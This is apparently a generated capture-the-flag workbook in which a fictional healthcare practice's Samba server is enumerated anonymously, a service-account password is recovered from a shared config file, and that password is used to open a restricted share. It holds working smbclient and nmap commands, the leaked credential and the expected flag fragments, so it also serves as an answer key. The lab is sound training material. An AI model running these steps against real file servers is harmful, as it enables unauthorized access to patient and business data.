# Hargrove Medical Group - SMB Credential Hunt

!!! note "Workbook generated from the lab definition"
    This walkthrough was generated from `linux-2-9-smb-credential-hunt/lab.yaml` and reviewed for
    structure. Verify the target name, commands, and output against the running
    lab before relying on them. Do not copy a flag from the lab definition; use
    the flag you recover in the environment.

## Before You Begin

- [ ] Launched **Hargrove Medical Group - SMB Credential Hunt** in the platform
- [ ] Opened the lab browser or terminal
- [ ] You can reach the target shown in the exercise
- [ ] Estimated time: **40 minutes** · Difficulty: **intermediate**

## Targets and Tools

- Use the target address shown in the exercise.

- No special tool list is declared; use the terminal or browser provided by the lab.

## Scenario

Hargrove Medical Group is a multi-location healthcare practice based in
Nashville, Tennessee. After a recent infrastructure upgrade, their IT
department deployed a new Linux-based file server running Samba to
centralize document sharing across their three clinic locations.

Your security consultancy has been engaged to assess the file server's
share permissions. The practice manager, Dr. Ellen Hargrove, is concerned
that sensitive clinical data may be accessible to unauthorized users.

"We store patient assessment forms and internal audit documents on that
server. Our IT contractor said guest access is limited to the welcome
materials, but I want proof."

Two assessment tokens have been placed across the shares. Enumerate all
shares, discover any leaked credentials, and retrieve both tokens.

## Your Objectives

- Enumerate SMB shares available on the target using anonymous access
- Access public shares and identify embedded assessment tokens
- Discover service account credentials through misconfigured file shares
- Authenticate to a restricted share using discovered credentials
- Assemble the complete flag from tokens found across multiple shares

## Background and Approach

Read the scenario before touching the target. Identify what you control, where
that input goes, and what evidence would prove success. Work from discovery to
verification: confirm the service, collect the minimum evidence, then capture
the flag. Use the lab's target list rather than guessing an address.

## Walkthrough

1. Launch the exercise and note the target address shown by the platform.
2. Confirm the target is reachable with a simple check before running a larger
   scan or exploit.
3. Work through the objectives in order. Record the exact command and the
   relevant output for each step.
4. If a step stalls, use the hint ladder below rather than jumping to a later
   hint.
5. When you recover the flag, submit it in the **Submit Flag** form and record
   the result.

### Reference commands

These are the lab's verification commands, with the target replaced by
`<target>`. They are a check, not a substitute for understanding the objective.

**SMB port is accessible**

```bash
nmap -p 445 --open <target> 2>&1 | grep -c '445.*open'
```

Expected: `1`

**List SMB shares anonymously**

```bash
smbclient -L //<target> -N 2>&1 | grep -c Disk
```

Expected: `3`

**Access public share and extract token 1**

```bash
smbclient //<target>/public -N -c 'get it_notes.txt /tmp/smb_itnotes.txt' 2>&1 && grep -o 'audit_token=[^ ]*' /tmp/smb_itnotes.txt | cut -d= -f2
```

Expected: `smb_hunt`

**Access records share and find credentials**

```bash
smbclient //<target>/records -N -c 'get backup_config.ini /tmp/smb_config.txt' 2>&1 && grep 'password' /tmp/smb_config.txt | sed 's/.*= *//' | head -1
```

Expected: `H4rgr0v3_M3d#`

**Use credentials to access clinical share and get token 2**

```bash
smbclient //<target>/clinical -U medsvc%H4rgr0v3_M3d# -c 'get assessment_marker.txt /tmp/smb_marker.txt' 2>&1 && cat /tmp/smb_marker.txt
```

Expected: `cr3ds`

**Verify assembled flag**

```bash
echo 'OCR{...}'
```

Expected: `OCR{`


### Hint ladder

<details><summary>Hint 1 (unlocks after 15 minutes)</summary>

Begin by discovering what SMB shares the server exposes. Use smbclient
to list shares with anonymous access: smbclient -L //<target_ip> -N
The -N flag sends a null (no password) authentication. Look for shares
that are marked as Disk type.

</details>

<details><summary>Hint 2 (unlocks after 25 minutes)</summary>

There are multiple shares allowing guest access. Connect to each one
and download all files. One share contains a notes file with an
embedded audit token. Another share has a configuration file that leaks
service account credentials for a restricted share.

</details>

<details><summary>Hint 3 (unlocks after 35 minutes)</summary>

The "records" share contains a backup_config.ini with credentials for
the medsvc account. Use those credentials to access the "clinical"
share: smbclient //<target_ip>/clinical -U medsvc%<password>
The second token is in a file on that share.

</details>


## Record Your Findings

| Item | Your result |
|---|---|
| Target address |  |
| Service or path discovered |  |
| Evidence that proves the objective |  |
| Flag recovered |  |
| What you would change defensively |  |

## Analysis Questions

1. What did you control, and where did that input reach?
2. Which check was missing or weak?
3. What evidence proves the objective was met, rather than only attempted?
4. What would a defender see in logs or monitoring?
5. What is the smallest fix that would stop the same path?

## Defensive Takeaway

Disable unused services, enforce key-based SSH with least privilege, and alert on unexpected authentication or command execution.

## If You Get Stuck

If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty.

Separate a platform problem from a learning problem:

- **Target unreachable:** check the lab status and the target address first.
- **Command error:** read the exact error; check the port, path, and credentials.
- **Technique fails:** compare your command with the reference command and the
  hint ladder.
- **Persistent failure:** report it to the instructor with the command and error.

## Key Takeaways

- You practised the objective in an isolated, fictional environment.
- The flag is evidence of completion, not a grade.
- The defensive takeaway matters as much as the offensive step.
- Keep the exact evidence so another analyst can reproduce the result.
